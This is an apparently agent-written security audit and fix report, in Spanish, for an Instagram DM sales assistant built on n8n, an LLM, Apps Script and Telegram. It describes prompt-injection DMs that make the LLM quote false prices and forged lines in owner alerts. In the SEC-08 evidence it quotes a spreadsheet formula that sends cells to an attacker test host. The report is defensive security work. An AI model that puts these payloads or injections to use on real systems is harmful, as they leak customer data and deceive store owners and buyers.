# Auditoría de seguridad — ig-assistant (2026-11-10)

Modo: auditoría, y luego **fix de SEC-01, SEC-02 y SEC-03** (aprobados por el usuario; ver "Estado de las correcciones"). Sin commits. Rama auditada: `fix/seguridad-gate` (commit `b7a0440`). No había reportes `CLAUDE-SECURITY-*/` previos.

## Preflight

| Requisito | Estado | Cómo levantarlo |
|---|---|---|
| Docker (n8n real para E2E) | El pedido decía "Docker no está corriendo"; un primer `docker info` falló, pero al momento de correr los tests el daemon respondía (`docker info` exit 0) y el fixture de `tests/conftest.py` levantó y bajó su propio proyecto `ig-assistant-e2e` (`down -v` al final; el volumen `ig-assistant_n8n_data` del usuario no se tocó). Los E2E de seguridad **sí corrieron**. | Si vuelve a estar apagado: abrir Docker Desktop (`"C:\Program Files\Docker\Docker\Docker Desktop.exe"`) y esperar a que `docker info` devuelva 0. |
| Node.js (harness de Code nodes y Apps Script) | v24.19.0 disponible | — |
| pytest / requests | `.venv` del proyecto (pytest 9.1.1) | `python -m venv .venv && .venv/Scripts/pip install -r requirements-dev.txt` |
| LLM real (Groq) | No usado (prohibido contactar hosts externos) | `python eval/live_eval.py` con key propia |

**Importante sobre `reports/`:** `tests/report_plugin.py` reescribe `reports/e2e-report.md` siempre que se ejecutan todos los tests *recolectados*, aunque se haya seleccionado un subconjunto por ruta (solo `-k`/`-m` lo evitan; el docstring dice otra cosa). Por eso los tests de seguridad se corrieron con `-o addopts=""`, que no carga el plugin. Además, como `testpaths = tests`, un `python -m pytest` completo ahora recolecta también `tests/security/` (25 tests, 17 en rojo) y dejaría esos fallos en el reporte E2E.

## Mapa

- **Entrada pública:** `POST /webhook/assistant` de n8n (`n8n/workflows/assistant.json`, generado desde `n8n/code/*.js`). ManyChat lo llama con el header `X-Assistant-Secret`. Meta → ManyChat lo firma y valida ManyChat; este repo no recibe webhooks de Meta.
- **LLM:** Groq (OpenAI-compatible), sin herramientas, system prompt = reglas + catálogo público, mensaje del cliente en un mensaje `user` aparte, recortado a 1000 caracteres, `max_tokens: 400`, sin historial.
- **Efectos laterales (decide n8n según `intent`):** `lead` → POST a Apps Script (secreto en el body) → fila en Google Sheet; `human`/fallback → Telegram al dueño (token en la URL).
- **Estado:** rate limits y dedup de leads en *workflow static data* de n8n.
- **Despliegue:** `docker-compose.yml` publica `127.0.0.1:5678` (editor, REST y webhooks en el mismo puerto). `docs/manychat-setup.md` paso 0 pide exponer n8n a internet por HTTPS (túnel o servidor).
- **Secretos (solo nombres):** `ASSISTANT_SECRET`, `GROQ_API_KEY`, `TELEGRAM_BOT_TOKEN`, `TELEGRAM_CHAT_ID`, `LEADS_URL`, `LEADS_SECRET`; Script Property `LEADS_SECRET`.

## Modelo de amenazas

- **Activos:** gasto de la API key de Groq; credibilidad de precios/condiciones comerciales ante clientes (una oferta publicada obliga al vendedor, Ley 24.240 art. 7); la planilla de leads (usuarios y mensajes de clientes); el canal Telegram del dueño; los secretos en el entorno de n8n.
- **Entradas no confiables:** cada DM y username de Instagram (cualquier desconocido); la salida del LLM; el body del webhook (lo arma ManyChat, pero cualquiera con `ASSISTANT_SECRET` lo controla entero).
- **Trifecta letal (feature: respuesta a DMs):** contenido no confiable = sí (el DM); canal de salida = la respuesta vuelve al mismo remitente, y el `intent` dispara escritura en Sheet/Telegram con el texto del propio remitente; **datos privados = no**: el contexto solo tiene el catálogo público y el mensaje actual, sin secretos ni historial de otros clientes. **Pata eliminada: datos privados**, probado por `test_llm_request_contains_no_secret_and_no_tools` y `test_second_customer_prompt_never_contains_first_customer_message` (verdes). El riesgo LLM que queda no es exfiltración sino **promesas comerciales falsas** y **costo/abuso**.

## Estado de las correcciones (modo fix, 2026-11-10)

Aprobados: SEC-01, SEC-02, SEC-03. SEC-04 a SEC-10 siguen abiertos y no se tocaron.

| ID | Estado | Cambio |
|---|---|---|
| SEC-01 | corregido | `n8n/code/parse_guard.js`: cada precio se atribuye al producto o zona de envío de su cláusula y tiene que ser el precio de ese producto |
| SEC-02 | corregido | misma guarda: NFKC, `mil`/`k`/`lucas`, montos en palabras, moneda extranjera, `%`, NxM, palabras de descuento junto a un precio, cuotas por encima del "hasta N cuotas" del catálogo |
| SEC-03 | corregido, con costo de throughput | `docker-compose.yml`: `N8N_CONCURRENCY_PRODUCTION_LIMIT: "1"` |

### SEC-01 y SEC-02: decisión

- **Enfoque:** la guarda (determinista, en n8n) detecta productos y zonas de envío con alias derivados de `catalog/catalog.json` (nombre completo, primeras dos palabras, sustantivo, categoría; gana el más largo), parte la respuesta en cláusulas y exige que cada precio pertenezca al sujeto de su cláusula: el producto más cercano; la zona de envío si la cláusula empieza por un envío; si la cláusula no nombra nada, la anterior; si la respuesta no nombra nada, el precio tiene que servir para **todos** los productos que nombró el cliente; si no hay sujeto, se bloquea. El costo de envío solo vale para envíos y el umbral de $80.000 solo en una oración de envío gratis ("superiores a", "más de", "desde"…).
- **Por qué no salida estructurada `{product_id, price}`:** cambia el contrato con el modelo y no se puede validar sin un LLM real (no se contactan hosts externos). Además, el modelo podría seguir escribiendo el nombre de un producto junto al ID de otro. La guarda mantiene el contrato y las respuestas legítimas actuales pasan igual.
- **Comportamiento ante una violación:** se mantiene el actual de `parse_guard` (no se decidió otro): respuesta de fallback, `intent: human`, `handoff: true` y alerta por Telegram al dueño.
- `build_request.js` ya no emite `allowedPrices`, que quedó sin uso; `parse_guard.js` recibe el catálogo horneado por `build_workflow.py`. `assistant.json` se regeneró.
- **Riesgo residual (documentado en el README):** la atribución es heurística. Una frase que pone el precio real de un producto justo después de otro producto en la misma cláusula ("la campera y la gorra salen $7.600") todavía pasa. Los totales de varios productos siempre van a handoff, igual que antes.

### SEC-03: decisión

- **Opciones evaluadas:** (a) `N8N_CONCURRENCY_PRODUCTION_LIMIT=1`; (b) un contador atómico en un almacén que el proyecto ya usa: el único es Apps Script/Sheet, que es remoto (1–2 s por mensaje, cuotas de Google) y no se puede probar localmente; (c) Redis o Postgres nuevos: un servicio y una credencial más, más nodos en el Gate, y el Gate deja de poder correr en el harness síncrono.
- **Elegida: (a)**, la menos invasiva que es correcta. Se verificó contra n8n real que n8n carga el static data del workflow cuando la ejecución obtiene su turno, no cuando llega el webhook. Con el límite en 1, la ráfaga de 15 mensajes de un contacto llegó al LLM como mucho 5 veces, y la de 25 contactos rotando como mucho 12.
- **Costo:** todas las ejecuciones de producción se serializan. Con latencia normal del LLM eso da ~20–60 mensajes por minuto (el tope por cuenta por defecto es 60/min). Con el LLM colgado, el último mensaje de una ráfaga espera ≈ (llamadas que llegan al LLM) × 3 s: el test de 25 contactos tardó ~38 s, más que el timeout de ManyChat. Es decir: el gasto queda acotado, pero bajo ataque o con el proveedor caído, los mensajes en cola pueden quedarse sin respuesta. Los efectos laterales (Telegram/Sheet, timeout de 8 s) también ocupan el turno.
- **Condiciones:** vale para una sola instancia de n8n en modo normal (sin queue mode ni varios workers). Si hace falta más throughput, hay que pasar los contadores a Redis `INCR` antes de subir el límite (documentado en el README y en `docs/manychat-setup.md`).
- **Cambio en el harness:** `Assistant.call` (`tests/conftest.py`) acepta `timeout` (por defecto 20 s, como antes) y los tests de carrera usan 120 s. Las aserciones de seguridad no cambiaron.
- **Contenedor del usuario:** hay que recrearlo (`docker compose up --force-recreate`) para que tome la variable nueva.

### Verificación (comandos y resultados observados)

| Qué | Comando | Resultado |
|---|---|---|
| Tests de ataque de los aprobados + guardas (sin Docker) | `.venv/Scripts/python -m pytest -o addopts="" -p no:cacheprovider -q tests/security/guards` | 55 passed, 3 deselected (en la auditoría: 12 failed, 8 passed) |
| Carreras E2E de SEC-03 contra n8n real | `.venv/Scripts/python -m pytest -o addopts="" -p no:cacheprovider -q tests/security/test_e2e_rate_limit_race.py` | 2 passed (en la auditoría: 15/15 y 25/25 llegaban al LLM) |
| Los hallazgos no aprobados siguen en rojo (opt-in, todo `tests/security` con Docker) | `.venv/Scripts/python -m pytest -o addopts="" -p no:cacheprovider -q -m "open_finding or not open_finding" tests/security` | 57 passed, **6 failed**: exactamente SEC-04, SEC-05 (×2), SEC-06, SEC-07 y SEC-08 |
| Eval de respuestas legítimas: 26 respuestas (las 6 reales de `reports/live-eval.md` con gpt-oss-120b, las de los E2E y 18 respuestas realistas) | `tests/security/guards/test_price_guard_legit_answers.py`, más una comparación contra una copia del código base | respuestas legítimas que pasan: **26/26 antes y 26/26 después** (ningún falso positivo nuevo); variantes de ataque extra bloqueadas: 0/12 antes, 12/12 después; ataques de la auditoría: 0/9 antes, 9/9 después |
| Drift (generado == commiteado) | `python n8n/build_workflow.py`, y comparar `build()` con `n8n/workflows/assistant.json` | idénticos |
| Suite completa existente (una sola vez, al final) | `.venv/Scripts/python -m pytest` | **78 passed, 6 deselected**. Esta corrida regeneró `reports/e2e-report.md` (78/78), como corresponde a una corrida completa |

No se corrió `eval/live_eval.py` (necesita Groq real). Conviene correrlo con una key propia y sumarle los casos de SEC-01/02.

### Tests de hallazgos abiertos (opt-in)

Los tests que fallan a propósito (SEC-04..SEC-08) llevan `@pytest.mark.open_finding`, y `tests/security/conftest.py` los deselecciona salvo que se pida ese marcador. Así `python -m pytest` queda en verde y no ensucia el reporte E2E. No se borró ni se debilitó ninguno. Al corregir un hallazgo, hay que quitarle el marcador a su test para que pase a ser una guarda de regresión.

## Hallazgos

| ID | Título | Estado | Severidad | Categoría | Archivo:línea |
|---|---|---|---|---|---|
| SEC-01 | La guarda de precios acepta un precio real del catálogo puesto en otro producto | **corregido** | alta | LLM09:2025, LLM05:2025, LLM01:2025 | `n8n/code/build_request.js:28-31`, `n8n/code/parse_guard.js:31-40` |
| SEC-02 | Promesas comerciales que la guarda no reconoce (palabras, USD, dígitos Unicode, %, cuotas) | **corregido** | media | LLM09:2025, LLM01:2025 | `n8n/code/parse_guard.js:32` |
| SEC-03 | Los rate limits (por contacto y por cuenta) no aguantan concurrencia: 100 % de una ráfaga llega al LLM | **corregido** (con costo de throughput) | alta | LLM10:2025, A06:2025 | `n8n/code/gate.js:49-79` |
| SEC-04 | El tope "global" se indexa por `account_id` del body: rotarlo anula el tope | confirmado | baja | LLM10:2025, A06:2025 | `n8n/code/gate.js:44,63-79` |
| SEC-05 | Editor y REST de n8n en el mismo puerto que el webhook, owner sin reclamar y `$env` abierto | confirmado (local) | media (crítica si se expone tal cual) | A02:2025, A01:2025 | `docker-compose.yml:20,39-40`, `docs/manychat-setup.md:9` |
| SEC-06 | Alertas de Telegram sin dedup: un desconocido genera 5 por minuto por cuenta de IG | confirmado | baja | LLM10:2025, ASI08:2026 | `n8n/code/parse_guard.js:44-53`, `n8n/build_workflow.py:193-200,210` |
| SEC-07 | El DM puede falsificar líneas "Contacto:" / "Mensaje:" en la alerta al dueño | confirmado | baja | LLM01:2025, ASI09:2026 | `n8n/code/parse_guard.js:62-65` |
| SEC-08 | Apps Script escribe `channel` y `contact_id` sin `safeCell` (fórmula viva en la planilla) | confirmado en código | baja | A05:2025 | `apps-script/Code.gs:124-130` |
| SEC-09 | `CLAUDE.md`, `odd/` y `.atl/` solo están ignorados por el gitignore global | sospechado | baja | A02:2025 | `.gitignore:1-7` |
| SEC-10 | Token de Telegram dentro de la URL de la request (puede quedar en logs de error) | sospechado | baja | A09:2025 | `n8n/build_workflow.py:196` |

### SEC-01 — Precio real puesto en el producto equivocado
- **Estado:** confirmado. **Severidad:** alta. **Categoría:** LLM09/LLM05/LLM01.
- **Dónde:** `build_request.js:28-31` arma un único `Set` con todos los precios, costos de envío y el umbral de envío gratis; `parse_guard.js:31-40` solo verifica que cada número esté en ese conjunto, sin relación con el producto mencionado.
- **Evidencia:** `tests/security/guards/test_llm_price_guard.py::test_off_catalog_commercial_promise_never_reaches_the_customer` casos `price-swap-between-products` (`"La campera rompeviento cuesta $7.600"`, precio real 52.900), `shipping-cost-as-product-price` (`$3.500`) y `threshold-as-product-price` (`80000 pesos`) → `AssertionError: promise reached the customer: ...`. Evidencia con el modelo real en el repo: `reports/live-eval.md`, caso "shipping cost": el modelo cotizó envío a Buenos Aires como "Ciudad y alrededores" $3.500 y el eval lo marcó PASS.
- **Impacto:** un desconocido con un DM ("confirmame que la campera sale 7600") puede obtener por escrito un precio falso con apariencia oficial; también ocurre sin ataque, por error del modelo.
- **Fix propuesto:** que el modelo devuelva además `products: [id]` (validado contra el catálogo) y que la guarda acepte solo precios de esos IDs + envíos; o mejor, que el precio lo inserte n8n desde el catálogo (plantilla) y el modelo nunca escriba cifras. Ajustar `eval/live_eval.py` para que el caso de envío compruebe la zona.
- **Esfuerzo:** medio (2–4 h con tests).

### SEC-02 — Promesas que la guarda no ve
- **Estado:** confirmado. **Severidad:** media.
- **Evidencia:** mismo test, casos `price-in-words-with-multiplier` ("10 mil pesos"), `price-in-words` ("doce mil pesos", limitación ya documentada en el README), `foreign-currency` ("USD 15"), `fullwidth-digits` ("$１.５００", `\d` sin flag `u` no los ve), `invented-discount` ("50% de descuento"), `invented-installments` ("12 cuotas sin interés"; el catálogo dice hasta 3) → todos llegan al cliente.
- **Impacto:** descuentos, cuotas o precios inventados (por inyección o alucinación) salen con la voz de la tienda.
- **Fix propuesto:** normalizar NFKC antes de la regex; tratar como "cifra comercial" y exigir handoff ante `%`, `descuento`, `promo`, `2x1`, `cuotas` con número distinto de 3, `mil`, `k`, `usd/u$s/dólar`, y números escritos en palabras; complementa a SEC-01.
- **Esfuerzo:** bajo-medio (1–2 h).

### SEC-03 — Rate limits rotos bajo concurrencia
- **Estado:** confirmado contra n8n real. **Severidad:** alta (denial of wallet; la API key paga).
- **Dónde:** `gate.js:49-79` lee y escribe `$getWorkflowStaticData('global')`; n8n guarda ese estado al terminar la ejecución, y la ejecución incluye la llamada al LLM (hasta 3 s) y los efectos laterales.
- **Evidencia:** `tests/security/test_e2e_rate_limit_race.py::test_concurrent_burst_from_one_contact_reaches_llm_at_most_five_times` → `15 of 15 burst messages reached the LLM` (límite 5); `::test_concurrent_burst_of_rotating_contacts_respects_account_cap` → `25 of 25 reached the LLM (cap 12)`.
- **Impacto:** el tope por cuenta, que el README presenta como límite del gasto total, no limita nada ante ráfagas: el gasto queda acotado solo por la velocidad del atacante (varias cuentas de IG enviando a la vez). El README menciona que "se puede exceder en una ráfaga"; la prueba muestra que se excede al 100 %.
- **Fix propuesto:** mover los contadores a un almacén atómico (Redis `INCR`+`EXPIRE` o Postgres con `UPDATE ... RETURNING`) consultado desde el Gate; como defensa adicional, limitar concurrencia de ejecuciones de producción (`N8N_CONCURRENCY_PRODUCTION_LIMIT`), un rate limit en el borde (Cloudflare) y un tope de gasto en la consola de Groq.
- **Esfuerzo:** medio (Redis en compose + nodo + tests, 3–5 h).

### SEC-04 — `account_id` lo elige quien llama
- **Estado:** confirmado. **Severidad:** baja (requiere `ASSISTANT_SECRET` o un mapeo de ManyChat que tome el campo de algo controlable).
- **Evidencia:** `tests/security/guards/test_gate_spend_cap.py::test_rotating_account_id_does_not_lift_the_global_spend_cap` → `40 of 40 requests reached the LLM (cap 12)`; el control positivo con cuenta fija da exactamente 12 (verde). También crece el static data con una clave por cuenta inventada.
- **Fix propuesto:** un tope global real además del tope por cuenta, o una allowlist de `account_id` por env (`ALLOWED_ACCOUNT_IDS`) y rechazar el resto.
- **Esfuerzo:** bajo (<1 h).

### SEC-05 — Superficie de administración de n8n
- **Estado:** confirmado localmente. **Severidad:** media hoy (bind a `127.0.0.1`); crítica si se sigue `docs/manychat-setup.md` paso 0 exponiendo el puerto completo.
- **Evidencia:** `tests/security/test_e2e_owner_alerts_and_exposure.py::test_webhook_listener_does_not_serve_the_editor_or_rest_api` → `editor UI served on the webhook port`; `::test_fresh_instance_does_not_offer_owner_setup_to_first_visitor` → `owner account is unclaimed on a reachable instance` (`/rest/settings` devuelve `showSetupOnFirstLoad: true`).
- **Impacto:** quien llegue primero a un n8n recién expuesto crea la cuenta owner y, con `N8N_BLOCK_ENV_ACCESS_IN_NODE: "false"`, lee `GROQ_API_KEY`, `LEADS_SECRET`, token de Telegram y `ASSISTANT_SECRET` desde un Code node.
- **Fix propuesto:** documentar en `docs/manychat-setup.md` que solo se publica la ruta `/webhook/assistant` (regla de ingress del túnel por path) y que el editor va detrás de Cloudflare Access o solo por localhost; crear el owner antes de exponer; evaluar pasar la configuración por credenciales de n8n en lugar de `$env`.
- **Esfuerzo:** bajo (docs + config de túnel, ~1 h).

### SEC-06 — Inundación de alertas al dueño
- **Estado:** confirmado. **Severidad:** baja.
- **Evidencia:** `test_e2e_owner_alerts_and_exposure.py::test_one_contact_triggers_at_most_one_owner_alert_per_window` → `5 alerts for one contact in one minute`. El fallback (provocable pidiendo cualquier cifra fuera del catálogo) también dispara alerta.
- **Impacto:** fatiga de alertas; las reales se pierden entre el ruido; con N cuentas, N×5 por minuto (más con SEC-03).
- **Fix propuesto:** reusar el patrón de `claim_lead.js`: un claim por contacto y ventana para `human`, y un tope de alertas por hora.
- **Esfuerzo:** bajo (~1 h).

### SEC-07 — Estructura falsificada en la alerta
- **Estado:** confirmado. **Severidad:** baja.
- **Evidencia:** `tests/security/guards/test_owner_alert_injection.py::test_dm_cannot_forge_alert_structure` → `forged contact lines: ['Contacto: ana [c-1]', 'Contacto: soporte_oficial [1]']`.
- **Impacto:** ingeniería social al dueño ("pago aprobado, enviá sin cobrar", o hacerle contestar a otro contacto).
- **Fix propuesto:** reemplazar saltos de línea del mensaje y del username por espacios (o citar el mensaje entre comillas en una sola línea) antes de armar `alertText`.
- **Esfuerzo:** muy bajo (15 min).

### SEC-08 — Fórmulas vivas en la planilla de leads
- **Estado:** confirmado en el código (la evaluación en Google Sheets no se ejercitó). **Severidad:** baja (requiere `LEADS_SECRET`, o `ASSISTANT_SECRET` para fijar `channel`/`contact_id` vía n8n).
- **Evidencia:** `tests/security/guards/test_apps_script_leads.py::test_every_caller_supplied_column_is_neutralized` → `live formulas written: ['=IMPORTXML("https://attacker.test/?d="&E2,"//a")', '=HYPERLINK("https://attacker.test")', ...]`.
- **Impacto:** `IMPORTXML`/`IMAGE` pueden enviar celdas de otros clientes a un host externo cuando el dueño abre la hoja.
- **Fix propuesto:** aplicar `safeCell` a `channel` y `contactId` en `appendRow` (y validar `channel` contra una allowlist).
- **Esfuerzo:** muy bajo (15 min).

### SEC-09 — Ignorados solo por config global (sospechado)
`CLAUDE.md` dice no commitear `odd/`, `.atl/` ni notas del agente, pero el `.gitignore` del repo no los lista; hoy los excluye `~/.gitignore_global`. En otro clon o máquina se subirían a un repo público. Fix: agregarlos al `.gitignore` del repo. Esfuerzo: 5 min.

### SEC-10 — Token de Telegram en la URL (sospechado)
`Notify Owner` arma `.../bot<TOKEN>/sendMessage`. Con `continueRegularOutput` no se propaga, y las ejecuciones no se guardan, pero los mensajes de error del nodo HTTP pueden incluir la URL en logs del contenedor. No verificado. Fix: revisar `docker compose logs` tras un fallo forzado de Telegram; si aparece, bajar `N8N_LOG_LEVEL` o usar el nodo Telegram con credencial.

## Lo que expone el repo público

- Sin secretos: 13 patrones (`gsk_`, token de bot de Telegram, `AKfycb`, URLs `script.google.com/macros/s/…`, `sk-`, `AKIA`, `ghp_`, claves privadas, hosts de túnel, asignaciones reales en `.env*`, emails) sobre todo el historial (`git log --all -p`) dieron **0 coincidencias**; `.env` nunca se commiteó. Los tokens de `tests/fake_services.py` son ficticios.
- Sí revela: ruta `/webhook/assistant`, nombre del header `X-Assistant-Secret`, workflow id `igAssistant0001`, `webhookId`, versión exacta `n8n:2.18.7`, contrato del Apps Script (secreto en el body) y **la regex exacta de la guarda de precios y los valores de rate limit**, que es justo lo que un atacante necesita para SEC-01/02/03. No revela host de n8n ni URL del deployment de Apps Script. Mientras el secreto sea largo y la ruta del editor no esté expuesta, esto es aceptable; la mitigación real es cerrar SEC-01..03.

## Lo que ya está bien defendido (tests en verde)

| Defensa | Test |
|---|---|
| Ningún secreto ni URL de config llega al request del LLM; sin `tools`; el DM no entra al system prompt | `tests/security/guards/test_llm_context_isolation.py::test_llm_request_contains_no_secret_and_no_tools` |
| Sin fuga entre clientes (sin historial compartido) | `::test_second_customer_prompt_never_contains_first_customer_message` |
| DM recortado a 1000 caracteres, `max_tokens ≤ 400` | `::test_huge_message_is_clipped_and_output_is_bounded` |
| `ASSISTANT_SECRET` vacío o distinto (incluido cambio de mayúsculas) → 401, falla cerrado | `::test_unset_server_secret_fails_closed` |
| Apps Script: secreto incorrecto, vacío o Script Property ausente → no escribe nada | `test_apps_script_leads.py::test_wrong_or_missing_secret_writes_nothing` |
| Apps Script: `message`/`username` con `= + - @` neutralizados al crear y al actualizar | `::test_message_and_username_formulas_are_neutralized_on_create_and_update` |
| Controles positivos (el harness ve ambos estados) | `test_llm_price_guard.py::test_positive_control_guard_passes_catalog_price_and_blocks_invented_one`, `test_gate_spend_cap.py::test_positive_control_fixed_account_is_capped` |

Además (lectura de código): comparación de secreto sin cortocircuito por carácter en `gate.js` y `Code.gs` (la de `gate.js` sí corta por longitud, lo que filtra solo el largo; irrelevante con un secreto largo), `EXECUTIONS_DATA_SAVE_*: none` evita guardar mensajes de clientes, puerto publicado solo en `127.0.0.1`, imagen de n8n fijada por versión.

## No verificado y por qué

- Comportamiento del modelo real ante inyecciones: no se contactan hosts externos; correr `python eval/live_eval.py` con key propia y agregar los casos de SEC-01/02.
- Evaluación real de fórmulas en Google Sheets y el redirect de Apps Script: requiere cuenta de Google.
- Si ManyChat envía mensajes concurrentes del mismo contacto (afecta cuán fácil es SEC-03 con una sola cuenta): requiere cuenta real.
- CVEs de `n8n:2.18.7` y auditoría de dependencias (`pip-audit`): requieren red externa.
- Endurecimiento del contenedor (`cap_drop`, `no-new-privileges`, límites de memoria, red sin egreso): no hay despliegue; recomendado al pasar a un VPS.
- Logs de n8n con el token de Telegram (SEC-10).

## Configuración manual (no comprobable desde el repo)

- [ ] **Túnel / proxy:** publicar solo `POST /webhook/assistant` (regla de ingress por path en Cloudflare Tunnel o `location` exacto en nginx); todo lo demás 404. Nunca el puerto 5678 completo.
- [ ] **Editor n8n:** hostname aparte detrás de Cloudflare Access (o solo localhost/VPN); crear la cuenta owner **antes** de exponer nada; activar MFA del owner.
- [ ] **Firewall del host:** denegar todo entrante salvo 443 (y SSH por clave desde tu IP o vía Tunnel); verificar con `ss -tlnp` que 5678 escucha solo en 127.0.0.1.
- [ ] **Cloudflare:** SSL Full (strict), WAF administrado, regla de rate limiting sobre `/webhook/assistant`, Bot Fight Mode desactivado para ese hostname (bloquearía a ManyChat), páginas de error propias.
- [ ] **Groq:** key exclusiva para este proyecto, límite de gasto/alerta de presupuesto en la consola, rotar si se filtró.
- [ ] **ManyChat:** body del External Request con `channel` fijo y sin `account_id` mapeado desde campos que el usuario pueda tocar; 2FA en la cuenta; acción de pausar automatización en handoff (reduce SEC-06).
- [ ] **ASSISTANT_SECRET / LEADS_SECRET:** valores aleatorios de 32+ caracteres, distintos entre sí; rotarlos si aparecieron en capturas de ManyChat o en chats.
- [ ] **Apps Script:** URL `/exec` tratada como secreta; la hoja compartida solo con el dueño; revisar que el aviso de "datos externos" de Sheets esté activo.
- [ ] **Telegram:** el bot solo en el chat del dueño; token en `.env`, nunca en capturas.
- [ ] **GitHub (repo público):** activar secret scanning y push protection; protección de rama en `main`.
- [ ] **Instagram / Meta:** 2FA en la cuenta profesional y en la página de Facebook vinculada.

## Cómo volver a correr los tests

```bash
# Guardas deterministas (sin Docker; ejecutan el código real de los Code nodes del workflow generado)
.venv/Scripts/python -m pytest -o addopts="" -p no:cacheprovider -q -rA tests/security/guards

# Todo tests/security sin los hallazgos abiertos (incluye E2E contra n8n real; necesita Docker)
.venv/Scripts/python -m pytest -o addopts="" -p no:cacheprovider -q -rA tests/security

# Solo los hallazgos abiertos (tienen que fallar hasta que se corrijan)
.venv/Scripts/python -m pytest -o addopts="" -p no:cacheprovider -q -m open_finding tests/security
```

`-o addopts=""` evita cargar `tests/report_plugin.py`, que si no reescribe `reports/e2e-report.md`. `python -m pytest` (la suite completa, que ahora incluye `tests/security` sin los `open_finding`) sí lo reescribe.

Resultado de la auditoría (2026-11-10, antes del fix): 25 tests, 8 verdes, 17 rojos. Después del fix: ver "Verificación" más arriba.
